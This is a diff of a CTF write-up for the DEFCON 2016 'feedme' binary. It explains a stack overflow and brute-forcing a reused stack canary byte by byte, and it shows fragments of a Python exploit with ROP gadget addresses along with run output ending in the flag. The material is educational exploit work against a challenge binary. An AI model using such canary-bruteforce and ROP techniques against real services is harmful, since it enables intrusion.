@@ -1,18 +1,18 @@
 #feedme - DEFCON 2016
 
-First at all execute `file` command on the binary
+First of all execute `file` command on the binary
 ```bash
-$ file feedme 
+$ file feedme
 feedme: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.24, stripped
 ```
 
-and with `checksec` we see that NX is enabled and debugging a little bit we realize that the usage of the binary is simple: a "parent" process launches child processes that takes 1 byte `x`, then reads `x` number of bytes. But the length of the buffer is 32, so if we send "\x36" + "A"*0x36 the canary is overwritten and smash the stack detected. 
+and with `checksec` we see that NX is enabled and debugging a little bit we realize that the usage of the binary is simple: a "parent" process launches child processes that takes 1 byte `x`, then reads `x` number of bytes. But the length of the buffer is 32, so if we send "\x36" + "A"*0x36 the canary is overwritten and smash the stack detected.
 
 So we have to leak the canary in order to overwrite the return address. The bug was that child's canary is always the same, so we can try to send 0x32 bytes of garbage and bruteforce the 33th byte (easy, always `\x00`), then the 34th, then the 35th and 36th one.
 
-This part of the exploit is 
+This part of the exploit is
 
-```python 
+```python
 #!/usr/bin/env python2
 
 import sys, socket, telnetlib
@@ -49,7 +49,7 @@ while len(canary)!=4:
 		#print brute
 		init = binascii.unhexlify(hex(32+len(canary)+1)[2:])
 		garbage = "A"*32
-		
+
 		if len(hex(brute)[2:])==1:
 			pad = "0"
 		else:
@@ -100,7 +100,7 @@ p += p32(0x100) #length
 p += p32(0x080ea060)#address
 p += p32(0x01) #FD
 p += p32(0x0806FA20) #int 80; ret
-``` 
+```
 
 PWN THEM!!
 
@@ -121,7 +121,7 @@ YUM, got 34 bytes!
 Child exit.
 FEED ME!
 
-LEAKED: 
+LEAKED:
 ATE 41414141414141414141414141414141...
 YUM, got 35 bytes!
 Child exit.
@@ -139,11 +139,11 @@ PWN THEM!!
 
 ATE 41414141414141414141414141414141...
 
-interactive 
+interactive
 The flag is: It's too bad! we c0uldn't??! d0 the R0P CHAIN BLIND TOO
 ��������@�
          Child exit.
 FEED ME!
 ```
 
-The full exploit is available here the full exploit is available [here](exploit.py)! 
+The full exploit is available here the full exploit is available [here](exploit.py)!
